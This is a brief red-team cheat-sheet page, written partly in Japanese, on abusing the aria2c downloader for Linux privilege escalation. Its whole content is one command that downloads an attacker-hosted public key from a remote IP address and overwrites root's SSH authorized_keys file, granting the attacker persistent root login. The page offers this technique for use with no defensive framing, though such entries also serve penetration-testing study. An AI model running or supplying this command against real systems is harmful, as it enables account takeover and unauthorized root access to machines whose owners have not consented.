---
title: aria2c
parent: Lin Privilege Escalation
grand_parent: Red Team
---

# `aria2c`
ファイルの並列ダウンロード）コマンドを使用したファイルの上書き

```bash
aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.0.99:8000/id_rsa.pub" --allow-overwrite=true
```